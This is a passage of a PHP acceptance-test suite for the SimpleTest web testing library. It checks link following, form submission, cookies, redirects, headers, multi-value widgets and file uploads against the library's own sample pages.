        $this->post($this->samples() . 'network_confirm.php', array("a[aa][aaa]" => "aaaa"));
        $this->assertPattern('/Request method.*?<dd>POST<\/dd>/');
        $this->assertText('a=[aa=[aaa=[aaaa]]]');

        $this->post($this->samples() . 'network_confirm.php', array("a" => array("aa" => "aaa")));
        $this->assertPattern('/Request method.*?<dd>POST<\/dd>/');
        $this->assertText('a=[aa=[aaa]]');

        $this->post($this->samples() . 'network_confirm.php', array("a" => array("aa" => array("aaa" => "aaaa"))));
        $this->assertPattern('/Request method.*?<dd>POST<\/dd>/');
        $this->assertText('a=[aa=[aaa=[aaaa]]]');
    }

    function testRelativeGet() {
        $this->get($this->samples() . 'link_confirm.php');
        $this->assertTrue($this->get('network_confirm.php'));
        $this->assertText('target for the SimpleTest');
    }

    function testRelativePost() {
        $this->post($this->samples() . 'link_confirm.php', array('a' => '123'));
        $this->assertTrue($this->post('network_confirm.php'));
        $this->assertText('target for the SimpleTest');
    }
}

class TestOfLinkFollowing extends SimpleTestAcceptanceTest {
    function setUp() {
        $this->addHeader('User-Agent: SimpleTest ' . SimpleTest::getVersion());
    }

    function testLinkAssertions() {
        $this->get($this->samples() . 'link_confirm.php');
        $this->assertLink('Absolute', $this->samples() . 'network_confirm.php');
        $this->assertLink('Absolute', new PatternExpectation('/confirm/'));
        $this->assertClickable('Absolute');
    }

    function testAbsoluteLinkFollowing() {
        $this->get($this->samples() . 'link_confirm.php');
        $this->assertTrue($this->clickLink('Absolute'));
        $this->assertText('target for the SimpleTest');
    }

    function testRelativeLinkFollowing() {
        $this->get($this->samples() . 'link_confirm.php');
        $this->assertTrue($this->clickLink('Relative'));
        $this->assertText('target for the SimpleTest');
    }

    function testLinkIdFollowing() {
        $this->get($this->samples() . 'link_confirm.php');
        $this->assertLinkById(1);
        $this->assertTrue($this->clickLinkById(1));
        $this->assertText('target for the SimpleTest');
    }

    function testAbsoluteUrlBehavesAbsolutely() {
        $this->get($this->samples() . 'link_confirm.php');
        $this->get('http://www.lastcraft.com');
        $this->assertText('No guarantee of quality is given or even intended');
    }

    function testRelativeUrlRespectsBaseTag() {
        $this->get($this->samples() . 'base_tag/base_link.html');
        $this->click('Back to test pages');
        $this->assertTitle('Simple test target file');
    }
}

class TestOfLivePageLinkingWithMinimalLinks extends SimpleTestAcceptanceTest {
    function setUp() {
        $this->addHeader('User-Agent: SimpleTest ' . SimpleTest::getVersion());
    }

    function testClickToExplicitelyNamedSelfReturns() {
        $this->get($this->samples() . 'front_controller_style/a_page.php');
        $this->assertEqual($this->getUrl(), $this->samples() . 'front_controller_style/a_page.php');
        $this->assertTitle('Simple test page with links');
        $this->assertLink('Self');
        $this->clickLink('Self');
        $this->assertTitle('Simple test page with links');
    }

    function testClickToMissingPageReturnsToSamePage() {
        $this->get($this->samples() . 'front_controller_style/a_page.php');
        $this->clickLink('No page');
        $this->assertTitle('Simple test page with links');
        $this->assertText('[action=no_page]');
    }

    function testClickToBareActionReturnsToSamePage() {
        $this->get($this->samples() . 'front_controller_style/a_page.php');
        $this->clickLink('Bare action');
        $this->assertTitle('Simple test page with links');
        $this->assertText('[action=]');
    }

    function testClickToSingleQuestionMarkReturnsToSamePage() {
        $this->get($this->samples() . 'front_controller_style/a_page.php');
        $this->clickLink('Empty query');
        $this->assertTitle('Simple test page with links');
    }

    function testClickToEmptyStringReturnsToSamePage() {
        $this->get($this->samples() . 'front_controller_style/a_page.php');
        $this->clickLink('Empty link');
        $this->assertTitle('Simple test page with links');
    }

    function testClickToSingleDotGoesToCurrentDirectory() {
        $this->get($this->samples() . 'front_controller_style/a_page.php');
        $this->clickLink('Current directory');
        $this->assertTitle(
                'Simple test front controller',
                '%s -> index.php needs to be set as a default web server home page');
    }

    function testClickBackADirectoryLevel() {
        $this->get($this->samples() . 'front_controller_style/');
        $this->clickLink('Down one');
        $this->assertPattern('|Index of .*?/test|i');
    }
}

class TestOfLiveFrontControllerEmulation extends SimpleTestAcceptanceTest {
    function setUp() {
        $this->addHeader('User-Agent: SimpleTest ' . SimpleTest::getVersion());
    }

    function testJumpToNamedPage() {
        $this->get($this->samples() . 'front_controller_style/');
        $this->assertText('Simple test front controller');
        $this->clickLink('Index');
        $this->assertResponse(200);
        $this->assertText('[action=index]');
    }

    function testJumpToUnnamedPage() {
        $this->get($this->samples() . 'front_controller_style/');
        $this->clickLink('No page');
        $this->assertResponse(200);
        $this->assertText('Simple test front controller');
        $this->assertText('[action=no_page]');
    }

    function testJumpToUnnamedPageWithBareParameter() {
        $this->get($this->samples() . 'front_controller_style/');
        $this->clickLink('Bare action');
        $this->assertResponse(200);
        $this->assertText('Simple test front controller');
        $this->assertText('[action=]');
    }

    function testJumpToUnnamedPageWithEmptyQuery() {
        $this->get($this->samples() . 'front_controller_style/');
        $this->clickLink('Empty query');
        $this->assertResponse(200);
        $this->assertPattern('/Simple test front controller/');
        $this->assertPattern('/raw get data.*?\[\].*?get data/si');
    }

    function testJumpToUnnamedPageWithEmptyLink() {
        $this->get($this->samples() . 'front_controller_style/');
        $this->clickLink('Empty link');
        $this->assertResponse(200);
        $this->assertPattern('/Simple test front controller/');
        $this->assertPattern('/raw get data.*?\[\].*?get data/si');
    }

    function testJumpBackADirectoryLevel() {
        $this->get($this->samples() . 'front_controller_style/');
        $this->clickLink('Down one');
        $this->assertPattern('|Index of .*?/test|');
    }

    function testSubmitToNamedPage() {
        $this->get($this->samples() . 'front_controller_style/');
        $this->assertText('Simple test front controller');
        $this->clickSubmit('Index');
        $this->assertResponse(200);
        $this->assertText('[action=Index]');
    }

    function testSubmitToSameDirectory() {
        $this->get($this->samples() . 'front_controller_style/index.php');
        $this->clickSubmit('Same directory');
        $this->assertResponse(200);
        $this->assertText('[action=Same+directory]');
    }

    function testSubmitToEmptyAction() {
        $this->get($this->samples() . 'front_controller_style/index.php');
        $this->clickSubmit('Empty action');
        $this->assertResponse(200);
        $this->assertText('[action=Empty+action]');
    }

    function testSubmitToNoAction() {
        $this->get($this->samples() . 'front_controller_style/index.php');
        $this->clickSubmit('No action');
        $this->assertResponse(200);
        $this->assertText('[action=No+action]');
    }

    function testSubmitBackADirectoryLevel() {
        $this->get($this->samples() . 'front_controller_style/');
        $this->clickSubmit('Down one');
        $this->assertPattern('|Index of .*?/test|');
    }

    function testSubmitToNamedPageWithMixedPostAndGet() {
        $this->get($this->samples() . 'front_controller_style/?a=A');
        $this->assertText('Simple test front controller');
        $this->clickSubmit('Index post');
        $this->assertText('action=[Index post]');
        $this->assertNoText('[a=A]');
    }

    function testSubmitToSameDirectoryMixedPostAndGet() {
        $this->get($this->samples() . 'front_controller_style/index.php?a=A');
        $this->clickSubmit('Same directory post');
        $this->assertText('action=[Same directory post]');
        $this->assertNoText('[a=A]');
    }

    function testSubmitToEmptyActionMixedPostAndGet() {
        $this->get($this->samples() . 'front_controller_style/index.php?a=A');
        $this->clickSubmit('Empty action post');
        $this->assertText('action=[Empty action post]');
        $this->assertText('[a=A]');
    }

    function testSubmitToNoActionMixedPostAndGet() {
        $this->get($this->samples() . 'front_controller_style/index.php?a=A');
        $this->clickSubmit('No action post');
        $this->assertText('action=[No action post]');
        $this->assertText('[a=A]');
    }
}

class TestOfLiveHeaders extends SimpleTestAcceptanceTest {
    function setUp() {
        $this->addHeader('User-Agent: SimpleTest ' . SimpleTest::getVersion());
    }

    function testConfirmingHeaderExistence() {
        $this->get('http://www.lastcraft.com/');
        $this->assertHeader('content-type');
        $this->assertHeader('content-type', 'text/html');
        $this->assertHeader('content-type', new PatternExpectation('/HTML/i'));
        $this->assertNoHeader('WWW-Authenticate');
    }
}

class TestOfLiveRedirects extends SimpleTestAcceptanceTest {
    function setUp() {
        $this->addHeader('User-Agent: SimpleTest ' . SimpleTest::getVersion());
    }

    function testNoRedirects() {
        $this->setMaximumRedirects(0);
        $this->get($this->samples() . 'redirect.php');
        $this->assertTitle('Redirection test');
    }

    function testRedirects() {
        $this->setMaximumRedirects(1);
        $this->get($this->samples() . 'redirect.php');
        $this->assertTitle('Simple test target file');
    }

    function testRedirectLosesGetData() {
        $this->get($this->samples() . 'redirect.php', array('a' => 'aaa'));
        $this->assertNoText('a=[aaa]');
    }

    function testRedirectKeepsExtraRequestDataOfItsOwn() {
        $this->get($this->samples() . 'redirect.php');
        $this->assertText('r=[rrr]');
    }

    function testRedirectLosesPostData() {
        $this->post($this->samples() . 'redirect.php', array('a' => 'aaa'));
        $this->assertTitle('Simple test target file');
        $this->assertNoText('a=[aaa]');
    }

    function testRedirectWithBaseUrlChange() {
        $this->get($this->samples() . 'base_change_redirect.php');
        $this->assertTitle('Simple test target file in folder');
        $this->get($this->samples() . 'path/base_change_redirect.php');
        $this->assertTitle('Simple test target file');
    }

    function testRedirectWithDoubleBaseUrlChange() {
        $this->get($this->samples() . 'double_base_change_redirect.php');
        $this->assertTitle('Simple test target file');
    }
}

class TestOfLiveCookies extends SimpleTestAcceptanceTest {
    function setUp() {
        $this->addHeader('User-Agent: SimpleTest ' . SimpleTest::getVersion());
    }

    function here() {
        return new SimpleUrl($this->samples());
    }

    function thisHost() {
        $here = $this->here();
        return $here->getHost();
    }

    function thisPath() {
        $here = $this->here();
        return $here->getPath();
    }

    function testCookieSettingAndAssertions() {
        $this->setCookie('a', 'Test cookie a');
        $this->setCookie('b', 'Test cookie b', $this->thisHost());
        $this->setCookie('c', 'Test cookie c', $this->thisHost(), $this->thisPath());
        $this->get($this->samples() . 'network_confirm.php');
        $this->assertText('Test cookie a');
        $this->assertText('Test cookie b');
        $this->assertText('Test cookie c');
        $this->assertCookie('a');
        $this->assertCookie('b', 'Test cookie b');
        $this->assertTrue($this->getCookie('c') == 'Test cookie c');
    }

    function testNoCookieSetWhenCookiesDisabled() {
        $this->setCookie('a', 'Test cookie a');
        $this->ignoreCookies();
        $this->get($this->samples() . 'network_confirm.php');
        $this->assertNoText('Test cookie a');
    }

    function testCookieReading() {
        $this->get($this->samples() . 'set_cookies.php');
        $this->assertCookie('session_cookie', 'A');
        $this->assertCookie('short_cookie', 'B');
        $this->assertCookie('day_cookie', 'C');
    }

    function testNoCookie() {
        $this->assertNoCookie('aRandomCookie');
    }

    function testNoCookieReadingWhenCookiesDisabled() {
        $this->ignoreCookies();
        $this->get($this->samples() . 'set_cookies.php');
        $this->assertNoCookie('session_cookie');
        $this->assertNoCookie('short_cookie');
        $this->assertNoCookie('day_cookie');
    }

    function testCookiePatternAssertions() {
        $this->get($this->samples() . 'set_cookies.php');
        $this->assertCookie('session_cookie', new PatternExpectation('/a/i'));
    }

    function testTemporaryCookieExpiry() {
        $this->get($this->samples() . 'set_cookies.php');
        $this->restart();
        $this->assertNoCookie('session_cookie');
        $this->assertCookie('day_cookie', 'C');
    }

    function testTimedCookieExpiryWith100SecondMargin() {
        $this->get($this->samples() . 'set_cookies.php');
        $this->ageCookies(3600);
        $this->restart(time() + 100);
        $this->assertNoCookie('session_cookie');
        $this->assertNoCookie('hour_cookie');
        $this->assertCookie('day_cookie', 'C');
    }

    function testNoClockOverDriftBy100Seconds() {
        $this->get($this->samples() . 'set_cookies.php');
        $this->restart(time() + 200);
        $this->assertNoCookie(
                'short_cookie',
                '%s -> Please check your computer clock setting if you are not using NTP');
    }

    function testNoClockUnderDriftBy100Seconds() {
        $this->get($this->samples() . 'set_cookies.php');
        $this->restart(time() + 0);
        $this->assertCookie(
                'short_cookie',
                'B',
                '%s -> Please check your computer clock setting if you are not using NTP');
    }

    function testCookiePath() {
        $this->get($this->samples() . 'set_cookies.php');
        $this->assertNoCookie('path_cookie', 'D');
        $this->get('./path/show_cookies.php');
        $this->assertPattern('/path_cookie/');
        $this->assertCookie('path_cookie', 'D');
    }
}

class LiveTestOfForms extends SimpleTestAcceptanceTest {
    function setUp() {
        $this->addHeader('User-Agent: SimpleTest ' . SimpleTest::getVersion());
    }

    function testSimpleSubmit() {
        $this->get($this->samples() . 'form.html');
        $this->assertTrue($this->clickSubmit('Go!'));
        $this->assertPattern('/Request method.*?<dd>POST<\/dd>/');
        $this->assertText('go=[Go!]');
    }

    function testDefaultFormValues() {
        $this->get($this->samples() . 'form.html');
        $this->assertFieldByName('a', '');
        $this->assertFieldByName('b', 'Default text');
        $this->assertFieldByName('c', '');
        $this->assertFieldByName('d', 'd1');
        $this->assertFieldByName('e', false);
        $this->assertFieldByName('f', 'on');
        $this->assertFieldByName('g', 'g3');
        $this->assertFieldByName('h', 2);
        $this->assertFieldByName('go', 'Go!');
        $this->assertClickable('Go!');
        $this->assertSubmit('Go!');
        $this->assertTrue($this->clickSubmit('Go!'));
        $this->assertText('go=[Go!]');
        $this->assertText('a=[]');
        $this->assertText('b=[Default text]');
        $this->assertText('c=[]');
        $this->assertText('d=[d1]');
        $this->assertNoText('e=[');
        $this->assertText('f=[on]');
        $this->assertText('g=[g3]');
    }

    function testFormSubmissionByButtonLabel() {
        $this->get($this->samples() . 'form.html');
        $this->setFieldByName('a', 'aaa');
        $this->setFieldByName('b', 'bbb');
        $this->setFieldByName('c', 'ccc');
        $this->setFieldByName('d', 'D2');
        $this->setFieldByName('e', 'on');
        $this->setFieldByName('f', false);
        $this->setFieldByName('g', 'g2');
        $this->setFieldByName('h', 1);
        $this->assertTrue($this->clickSubmit('Go!'));
        $this->assertText('a=[aaa]');
        $this->assertText('b=[bbb]');
        $this->assertText('c=[ccc]');
        $this->assertText('d=[d2]');
        $this->assertText('e=[on]');
        $this->assertNoText('f=[');
        $this->assertText('g=[g2]');
    }

    function testAdditionalFormValues() {
        $this->get($this->samples() . 'form.html');
        $this->assertTrue($this->clickSubmit('Go!', array('add' => 'A')));
        $this->assertText('go=[Go!]');
        $this->assertText('add=[A]');
    }

    function testFormSubmissionByName() {
        $this->get($this->samples() . 'form.html');
        $this->setFieldByName('a', 'A');
        $this->assertTrue($this->clickSubmitByName('go'));
        $this->assertText('a=[A]');
    }

    function testFormSubmissionByNameAndAdditionalParameters() {
        $this->get($this->samples() . 'form.html');
        $this->assertTrue($this->clickSubmitByName('go', array('add' => 'A')));
        $this->assertText('go=[Go!]');
        $this->assertText('add=[A]');
    }

    function testFormSubmissionBySubmitButtonLabeledSubmit() {
        $this->get($this->samples() . 'form.html');
        $this->assertTrue($this->clickSubmitByName('test'));
        $this->assertText('test=[Submit]');
    }

    function testFormSubmissionWithIds() {
        $this->get($this->samples() . 'form.html');
        $this->assertFieldById(1, '');
        $this->assertFieldById(2, 'Default text');
        $this->assertFieldById(3, '');
        $this->assertFieldById(4, 'd1');
        $this->assertFieldById(5, false);
        $this->assertFieldById(6, 'on');
        $this->assertFieldById(8, 'g3');
        $this->assertFieldById(11, 2);
        $this->setFieldById(1, 'aaa');
        $this->setFieldById(2, 'bbb');
        $this->setFieldById(3, 'ccc');
        $this->setFieldById(4, 'D2');
        $this->setFieldById(5, 'on');
        $this->setFieldById(6, false);
        $this->setFieldById(8, 'g2');
        $this->setFieldById(11, 'H1');
        $this->assertTrue($this->clickSubmitById(99));
        $this->assertText('a=[aaa]');
        $this->assertText('b=[bbb]');
        $this->assertText('c=[ccc]');
        $this->assertText('d=[d2]');
        $this->assertText('e=[on]');
        $this->assertNoText('f=[');
        $this->assertText('g=[g2]');
        $this->assertText('h=[1]');
        $this->assertText('go=[Go!]');
    }

    function testFormSubmissionWithIdsAndAdditionnalData() {
        $this->get($this->samples() . 'form.html');
        $this->assertTrue($this->clickSubmitById(99, array('additionnal' => "data")));
        $this->assertText('additionnal=[data]');
    }

    function testFormSubmissionWithLabels() {
        $this->get($this->samples() . 'form.html');
        $this->assertField('Text A', '');
        $this->assertField('Text B', 'Default text');
        $this->assertField('Text area C', '');
        $this->assertField('Selection D', 'd1');
        $this->assertField('Checkbox E', false);
        $this->assertField('Checkbox F', 'on');
        $this->assertField('3', 'g3');
        $this->assertField('Selection H', 2);
        $this->setField('Text A', 'aaa');
        $this->setField('Text B', 'bbb');
        $this->setField('Text area C', 'ccc');
        $this->setField('Selection D', 'D2');
        $this->setField('Checkbox E', 'on');
        $this->setField('Checkbox F', false);
        $this->setField('2', 'g2');
        $this->setField('Selection H', 'H1');
        $this->clickSubmit('Go!');
        $this->assertText('a=[aaa]');
        $this->assertText('b=[bbb]');
        $this->assertText('c=[ccc]');
        $this->assertText('d=[d2]');
        $this->assertText('e=[on]');
        $this->assertNoText('f=[');
        $this->assertText('g=[g2]');
        $this->assertText('h=[1]');
        $this->assertText('go=[Go!]');
    }

    function testSettingCheckboxWithBooleanTrueSetsUnderlyingValue() {
        $this->get($this->samples() . 'form.html');
        $this->setField('Checkbox E', true);
        $this->assertField('Checkbox E', 'on');
        $this->clickSubmit('Go!');
        $this->assertText('e=[on]');
    }

    function testFormSubmissionWithMixedPostAndGet() {
        $this->get($this->samples() . 'form_with_mixed_post_and_get.html');
        $this->setField('Text A', 'Hello');
        $this->assertTrue($this->clickSubmit('Go!'));
        $this->assertText('a=[Hello]');
        $this->assertText('x=[X]');
        $this->assertText('y=[Y]');
    }

    function testFormSubmissionWithMixedPostAndEncodedGet() {
        $this->get($this->samples() . 'form_with_mixed_post_and_get.html');
        $this->setField('Text B', 'Hello');
        $this->assertTrue($this->clickSubmit('Go encoded!'));
        $this->assertText('b=[Hello]');
        $this->assertText('x=[X]');
        $this->assertText('y=[Y]');
    }

    function testFormSubmissionWithoutAction() {
        $this->get($this->samples() . 'form_without_action.php?test=test');
        $this->assertText('_GET : [test]');
        $this->assertTrue($this->clickSubmit('Submit Post With Empty Action'));
        $this->assertText('_GET : [test]');
        $this->assertText('_POST : [test]');
    }

    function testImageSubmissionByLabel() {
        $this->get($this->samples() . 'form.html');
        $this->assertImage('Image go!');
        $this->assertTrue($this->clickImage('Image go!', 10, 12));
        $this->assertText('go_x=[10]');
        $this->assertText('go_y=[12]');
    }

    function testImageSubmissionByLabelWithAdditionalParameters() {
        $this->get($this->samples() . 'form.html');
        $this->assertTrue($this->clickImage('Image go!', 10, 12, array('add' => 'A')));
        $this->assertText('add=[A]');
    }

    function testImageSubmissionByName() {
        $this->get($this->samples() . 'form.html');
        $this->assertTrue($this->clickImageByName('go', 10, 12));
        $this->assertText('go_x=[10]');
        $this->assertText('go_y=[12]');
    }

    function testImageSubmissionById() {
        $this->get($this->samples() . 'form.html');
        $this->assertTrue($this->clickImageById(97, 10, 12));
        $this->assertText('go_x=[10]');
        $this->assertText('go_y=[12]');
    }

    function testButtonSubmissionByLabel() {
        $this->get($this->samples() . 'form.html');
        $this->assertTrue($this->clickSubmit('Button go!', 10, 12));
        $this->assertPattern('/go=\[ButtonGo\]/s');
    }

    function testNamelessSubmitSendsNoValue() {
        $this->get($this->samples() . 'form_with_unnamed_submit.html');
        $this->click('Go!');
        $this->assertNoText('Go!');
        $this->assertNoText('submit');
    }

    function testNamelessImageSendsXAndYValues() {
        $this->get($this->samples() . 'form_with_unnamed_submit.html');
        $this->clickImage('Image go!', 4, 5);
        $this->assertNoText('ImageGo');
        $this->assertText('x=[4]');
        $this->assertText('y=[5]');
    }

    function testNamelessButtonSendsNoValue() {
        $this->get($this->samples() . 'form_with_unnamed_submit.html');
        $this->click('Button Go!');
        $this->assertNoText('ButtonGo');
    }

    function testSelfSubmit() {
        $this->get($this->samples() . 'self_form.php');
        $this->assertNoText('[Submitted]');
        $this->assertNoText('[Wrong form]');
        $this->assertTrue($this->clickSubmit());
        $this->assertText('[Submitted]');
        $this->assertNoText('[Wrong form]');
        $this->assertTitle('Test of form self submission');
    }

    function testSelfSubmitWithParameters() {
        $this->get($this->samples() . 'self_form.php');
        $this->setFieldByName('visible', 'Resent');
        $this->assertTrue($this->clickSubmit());
        $this->assertText('[Resent]');
    }

    function testSettingOfBlankOption() {
        $this->get($this->samples() . 'form.html');
        $this->assertTrue($this->setFieldByName('d', ''));
        $this->clickSubmit('Go!');
        $this->assertText('d=[]');
    }

    function testAssertingFieldValueWithPattern() {
        $this->get($this->samples() . 'form.html');
        $this->setField('c', 'A very long string');
        $this->assertField('c', new PatternExpectation('/very long/'));
    }

    function testSendingMultipartFormDataEncodedForm() {
        $this->get($this->samples() . 'form_data_encoded_form.html');
        $this->assertField('Text A', '');
        $this->assertField('Text B', 'Default text');
        $this->assertField('Text area C', '');
        $this->assertField('Selection D', 'd1');
        $this->assertField('Checkbox E', false);
        $this->assertField('Checkbox F', 'on');
        $this->assertField('3', 'g3');
        $this->assertField('Selection H', 2);
        $this->setField('Text A', 'aaa');
        $this->setField('Text B', 'bbb');
        $this->setField('Text area C', 'ccc');
        $this->setField('Selection D', 'D2');
        $this->setField('Checkbox E', 'on');
        $this->setField('Checkbox F', false);
        $this->setField('2', 'g2');
        $this->setField('Selection H', 'H1');
        $this->assertTrue($this->clickSubmit('Go!'));
        $this->assertText('a=[aaa]');
        $this->assertText('b=[bbb]');
        $this->assertText('c=[ccc]');
        $this->assertText('d=[d2]');
        $this->assertText('e=[on]');
        $this->assertNoText('f=[');
        $this->assertText('g=[g2]');
        $this->assertText('h=[1]');
        $this->assertText('go=[Go!]');
    }

    function testSettingVariousBlanksInFields() {
        $this->get($this->samples() . 'form_with_false_defaults.html');
        $this->assertField('Text A', '');
        $this->setField('Text A', '0');
        $this->assertField('Text A', '0');
        $this->assertField('Text area B', '');
        $this->setField('Text area B', '0');
        $this->assertField('Text area B', '0');
        $this->assertField('Selection D', '');
        $this->setField('Selection D', 'D2');
        $this->assertField('Selection D', 'D2');
        $this->setField('Selection D', 'D3');
        $this->assertField('Selection D', '0');
        $this->setField('Selection D', 'D4');
        $this->assertField('Selection D', '?');
        $this->assertField('Checkbox E', '');
        $this->assertField('Checkbox F', 'on');
        $this->assertField('Checkbox G', '0');
        $this->assertField('Checkbox H', '?');
        $this->assertFieldByName('i', 'on');
        $this->setFieldByName('i', '');
        $this->assertFieldByName('i', '');
        $this->setFieldByName('i', '0');
        $this->assertFieldByName('i', '0');
        $this->setFieldByName('i', '?');
        $this->assertFieldByName('i', '?');
    }

    function testDefaultValueOfTextareaHasNewlinesAndWhitespacePreserved() {
        $this->get($this->samples() . 'form_with_false_defaults.html');
        $this->assertField('Text area C', '                ');
    }

    function chars($t) {
        for ($i = 0; $i < strlen($t); $i++) {
            print "[$t[$i]]";
        }
    }

    function testSubmissionOfBlankFields() {
        $this->get($this->samples() . 'form_with_false_defaults.html');
        $this->setField('Text A', '');
        $this->setField('Text area B', '');
        $this->setFieldByName('i', '');
        $this->click('Go!');
        $this->assertText('a=[]');
        $this->assertText('b=[]');
        $this->assertText('d=[]');
        $this->assertText('e=[]');
        $this->assertText('i=[]');
    }

    function testDefaultValueOfTextareaHasNewlinesAndWhitespacePreservedOnSubmission() {
        $this->get($this->samples() . 'form_with_false_defaults.html');
        $this->click('Go!');
        $this->assertPattern('/c=\[                \]/');
    }

    function testSubmissionOfEmptyValues() {
        $this->get($this->samples() . 'form_with_false_defaults.html');
        $this->setField('Selection D', 'D2');
        $this->click('Go!');
        $this->assertText('a=[]');
        $this->assertText('b=[]');
        $this->assertText('d=[D2]');
        $this->assertText('f=[on]');
        $this->assertText('i=[on]');
    }

    function testSubmissionOfZeroes() {
        $this->get($this->samples() . 'form_with_false_defaults.html');
        $this->setField('Text A', '0');
        $this->setField('Text area B', '0');
        $this->setField('Selection D', 'D3');
        $this->setFieldByName('i', '0');
        $this->click('Go!');
        $this->assertText('a=[0]');
        $this->assertText('b=[0]');
        $this->assertText('d=[0]');
        $this->assertText('g=[0]');
        $this->assertText('i=[0]');
    }

    function testSubmissionOfQuestionMarks() {
        $this->get($this->samples() . 'form_with_false_defaults.html');
        $this->setField('Text A', '?');
        $this->setField('Text area B', '?');
        $this->setField('Selection D', 'D4');
        $this->setFieldByName('i', '?');
        $this->click('Go!');
        $this->assertText('a=[?]');
        $this->assertText('b=[?]');
        $this->assertText('d=[?]');
        $this->assertText('h=[?]');
        $this->assertText('i=[?]');
    }

    function testSubmissionOfHtmlEncodedValues() {
        $this->get($this->samples() . 'form_with_tricky_defaults.html');
        $this->assertField('Text A', '&\'"<>');
        $this->assertField('Text B', '"');
        $this->assertField('Text area C', '&\'"<>');
        $this->assertField('Selection D', "'");
        $this->assertField('Checkbox E', '&\'"<>');
        $this->assertField('Checkbox F', false);
        $this->assertFieldByname('i', "'");
        $this->click('Go!');
        $this->assertText('a=[&\'"<>, "]');
        $this->assertText('c=[&\'"<>]');
        $this->assertText("d=[']");
        $this->assertText('e=[&\'"<>]');
        $this->assertText("i=[']");
    }

    function testFormActionRespectsBaseTag() {
        $this->get($this->samples() . 'base_tag/form.html');
        $this->assertTrue($this->clickSubmit('Go!'));
        $this->assertText('go=[Go!]');
        $this->assertText('a=[]');
    }
}

class TestOfLiveMultiValueWidgets extends SimpleTestAcceptanceTest {
    function setUp() {
        $this->addHeader('User-Agent: SimpleTest ' . SimpleTest::getVersion());
    }

    function testDefaultFormValueSubmission() {
        $this->get($this->samples() . 'multiple_widget_form.html');
        $this->assertFieldByName('a', array('a2', 'a3'));
        $this->assertFieldByName('b', array('b2', 'b3'));
        $this->assertFieldByName('c[]', array('c2', 'c3'));
        $this->assertFieldByName('d', array('2', '3'));
        $this->assertFieldByName('e', array('2', '3'));
        $this->assertTrue($this->clickSubmit('Go!'));
        $this->assertText('a=[a2, a3]');
        $this->assertText('b=[b2, b3]');
        $this->assertText('c=[c2, c3]');
        $this->assertText('d=[2, 3]');
        $this->assertText('e=[2, 3]');
    }

    function testSubmittingMultipleValues() {
        $this->get($this->samples() . 'multiple_widget_form.html');
        $this->setFieldByName('a', array('a1', 'a4'));
        $this->assertFieldByName('a', array('a1', 'a4'));
        $this->assertFieldByName('a', array('a4', 'a1'));
        $this->setFieldByName('b', array('b1', 'b4'));
        $this->assertFieldByName('b', array('b1', 'b4'));
        $this->setFieldByName('c[]', array('c1', 'c4'));
        $this->assertField('c[]', array('c1', 'c4'));
        $this->setFieldByName('d', array('1', '4'));
        $this->assertField('d', array('1', '4'));
        $this->setFieldByName('e', array('e1', 'e4'));
        $this->assertField('e', array('1', '4'));
        $this->assertTrue($this->clickSubmit('Go!'));
        $this->assertText('a=[a1, a4]');
        $this->assertText('b=[b1, b4]');
        $this->assertText('c=[c1, c4]');
        $this->assertText('d=[1, 4]');
        $this->assertText('e=[1, 4]');
    }

    function testSettingByOptionValue() {
        $this->get($this->samples() . 'multiple_widget_form.html');
        $this->setFieldByName('d', array('1', '4'));
        $this->assertField('d', array('1', '4'));
        $this->assertTrue($this->clickSubmit('Go!'));
        $this->assertText('d=[1, 4]');
    }

    function testSubmittingMultipleValuesByLabel() {
        $this->get($this->samples() . 'multiple_widget_form.html');
        $this->setField('Multiple selection A', array('a1', 'a4'));
        $this->assertField('Multiple selection A', array('a1', 'a4'));
        $this->assertField('Multiple selection A', array('a4', 'a1'));
        $this->setField('multiple selection C', array('c1', 'c4'));
        $this->assertField('multiple selection C', array('c1', 'c4'));
        $this->assertTrue($this->clickSubmit('Go!'));
        $this->assertText('a=[a1, a4]');
        $this->assertText('c=[c1, c4]');
    }

    function testSavantStyleHiddenFieldDefaults() {
        $this->get($this->samples() . 'savant_style_form.html');
        $this->assertFieldByName('a', array('a0'));
        $this->assertFieldByName('b', array('b0'));
        $this->assertTrue($this->clickSubmit('Go!'));
        $this->assertText('a=[a0]');
        $this->assertText('b=[b0]');
    }

    function testSavantStyleHiddenDefaultsAreOverridden() {
        $this->get($this->samples() . 'savant_style_form.html');
        $this->assertTrue($this->setFieldByName('a', array('a1')));
        $this->assertTrue($this->setFieldByName('b', 'b1'));
        $this->assertTrue($this->clickSubmit('Go!'));
        $this->assertText('a=[a1]');
        $this->assertText('b=[b1]');
    }

    function testSavantStyleFormSettingById() {
        $this->get($this->samples() . 'savant_style_form.html');
        $this->assertFieldById(1, array('a0'));
        $this->assertFieldById(4, array('b0'));
        $this->assertTrue($this->setFieldById(2, 'a1'));
        $this->assertTrue($this->setFieldById(5, 'b1'));
        $this->assertTrue($this->clickSubmitById(99));
        $this->assertText('a=[a1]');
        $this->assertText('b=[b1]');
    }
}

class TestOfFileUploads extends SimpleTestAcceptanceTest {
    function setUp() {
        $this->addHeader('User-Agent: SimpleTest ' . SimpleTest::getVersion());
    }

    function testSingleFileUpload() {
        $this->get($this->samples() . 'upload_form.html');
        $this->assertTrue($this->setField('Content:',
                dirname(__FILE__) . '/support/upload_sample.txt'));
        $this->assertField('Content:', dirname(__FILE__) . '/support/upload_sample.txt');
        $this->click('Go!');
        $this->assertText('Sample for testing file upload');
    }

    function testMultipleFileUpload() {
        $this->get($this->samples() . 'upload_form.html');
        $this->assertTrue($this->setField('Content:',
                dirname(__FILE__) . '/support/upload_sample.txt'));
        $this->assertTrue($this->setField('Supplemental:',
                dirname(__FILE__) . '/support/supplementary_upload_sample.txt'));
        $this->assertField('Supplemental:',
                dirname(__FILE__) . '/support/supplementary_upload_sample.txt');
        $this->click('Go!');
        $this->assertText('Sample for testing file upload');
        $this->assertText('Some more text content');
    }

    function testBinaryFileUpload() {
        $this->get($this->samples() . 'upload_form.html');
        $this->assertTrue($this->setField('Content:',
                dirname(__FILE__) . '/support/latin1_sample'));
        $this->click('Go!');
        $this->assertText(
                implode('', file(dirname(__FILE__) . '/support/latin1_sample')));
    }
}

class TestOfLiveHistoryNavigation extends SimpleTestAcceptanceTest {
    function setUp() {
        $this->addHeader('User-Agent: SimpleTest ' . SimpleTest::getVersion());
    }

    function testRetry() {
        $this->get($this->samples() . 'cookie_based_counter.php');
        $this->assertPattern('/count: 1/i');
        $this->retry();
        $this->assertPattern('/count: 2/i');
        $this->retry();
        $this->assertPattern('/count: 3/i');
    }

    function testOfBackButton() {
        $this->get($this->samples() . '1.html');
        $this->clickLink('2');
        $this->assertTitle('2');
        $this->assertTrue($this->back());
        $this->assertTitle('1');
        $this->assertTrue($this->forward());
        $this->assertTitle('2');
